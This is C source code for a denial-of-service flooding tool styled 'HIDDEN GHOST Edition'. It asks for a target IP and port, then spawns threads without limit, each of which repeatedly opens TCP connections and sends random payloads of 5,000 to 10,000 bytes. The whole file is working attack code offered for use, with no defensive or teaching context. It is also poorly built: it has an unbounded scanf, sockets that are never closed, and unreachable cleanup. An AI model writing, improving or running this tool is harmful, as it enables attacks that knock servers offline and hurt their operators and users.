#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <event2/event.h>
#include <event2/thread.h>
#include <event2/bufferevent.h>
#include <event2/buffer.h>
#include <time.h>

#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define CYAN "\033[1;36m"
#define RESET "\033[0m"

char target_ip[16];
int target_port;
struct event_base* base;
int stop_flag = 0;

void display_banner_fast() {
    printf("\n");
    printf(RED);
    printf(" ███████╗██╗   ██╗██╗███╗   ██╗ ██████╗██╗   ██╗\n");
    printf(" ██╔════╝╚██╗ ██╔╝██║████╗  ██║██╔════╝╚██╗ ██╔╝\n");
    printf(" █████╗   ╚████╔╝ ██║██╔██╗ ██║██║      ╚████╔╝ \n");
    printf(" ██╔══╝    ╚██╔╝  ██║██║╚██╗██║██║       ╚██╔╝  \n");
    printf(" ███████╗   ██║   ██║██║ ╚████║╚██████╗   ██║   \n");
    printf(" ╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝   \n");
    printf("        Version: 666 - HIDDEN GHOST Edition\n\n");
    printf(RESET);
    usleep(200000); // 200 milliseconds delay
    system("clear"); // Clear the screen
    printf(CYAN);
    printf(" ███████╗██╗   ██╗██╗███╗   ██╗ ██████╗██╗   ██╗\n");
    printf(" ██╔════╝╚██╗ ██╔╝██║████╗  ██║██╔════╝╚██╗ ██╔╝\n");
    printf(" █████╗   ╚████╔╝ ██║██╔██╗ ██║██║      ╚████╔╝ \n");
    printf(" ██╔══╝    ╚██╔╝  ██║██║╚██╗██║██║       ╚██╔╝  \n");
    printf(" ███████╗   ██║   ██║██║ ╚████║╚██████╗   ██║   \n");
    printf(" ╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝   \n");
    printf("        Version: 666 - HIDDEN GHOST Edition\n\n");
    printf(RESET);
    usleep(200000); // 200 milliseconds delay
}

void ultra_beast_ddos_attack(void* arg) {
    char* payload = (char*)arg;

    while (!stop_flag) {
        int victim = socket(AF_INET, SOCK_STREAM, 0);

        struct sockaddr_in target_addr;
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(target_port);
        inet_aton(target_ip, &(target_addr.sin_addr));

        connect(victim, (struct sockaddr*)&target_addr, sizeof(target_addr));

        send(victim, payload, strlen(payload), 0);

        printf(GREEN);
        printf(" 💥 ULTRA BEAST MODE ATTACK on %s:%d with %s 💥\n", target_ip, target_port, payload);
        printf(RESET);

        usleep(500);
    }
}

void set_ultra_beast_options(int sock) {
    int flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(int));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&flag, sizeof(int));
    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (char*)&flag, sizeof(int));

    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 200;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(struct timeval));
}

void stop_attack(int signum) {
    (void)signum;
    printf(RED);
    printf(" ❌ Attempting to stop the ULTRA BEAST MODE attack! ❌\n");
    printf(RESET);
    stop_flag = 1;
}

void generate_random_payload(char* payload, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t charset_size = sizeof(charset) - 1;

    srand(time(NULL));

    for (size_t i = 0; i < size; ++i) {
        payload[i] = charset[rand() % charset_size];
    }

    payload[size] = '\0';
}

int main() {
    display_banner_fast();
    base = event_base_new();

    printf(" 🌐 Enter the target IP: ");
    scanf("%s", target_ip);
    printf(" 🚪 Enter the target port: ");
    scanf("%d", &target_port);

    signal(SIGTSTP, stop_attack);

    for (;;) {
        int sock;
        pthread_t thread;

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        set_ultra_beast_options(sock);

        size_t random_payload_size = rand() % 5000 + 5000; // Generate a random payload size between 5000 and 10000
        char random_payload[random_payload_size + 1];
        generate_random_payload(random_payload, random_payload_size);

        pthread_create(&thread, NULL, (void* (*)(void*))ultra_beast_ddos_attack, (void*)random_payload);

        usleep(1000); // Sleep for 1 millisecond to avoid overwhelming the system
    }

    event_base_dispatch(base);
    event_base_free(base);

    return 0;
}
